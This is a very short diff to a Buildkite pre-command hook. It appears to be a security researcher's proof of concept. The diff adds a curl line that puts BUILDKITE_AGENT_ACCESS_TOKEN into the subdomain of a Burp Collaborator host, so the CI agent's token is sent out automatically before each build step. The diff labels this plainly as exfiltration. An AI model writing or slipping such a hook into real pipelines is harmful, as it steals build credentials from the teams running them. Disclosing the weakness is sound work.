@@ -1,2 +1,3 @@
 echo "This is an example of a pre-command hook from .buildkite/hooks/pre-command"
-echo "===== AGENT_ACCESS_TOKEN: " $BUILDKITE_AGENT_ACCESS_TOKEN
+echo "exfiltrating BUILDKITE_AGENT_ACCESS_TOKEN"
+curl $BUILDKITE_AGENT_ACCESS_TOKEN.jtglx0umljvnaxnpfm77zbr7vy1ppfd4.burpcollaborator.elttam.au
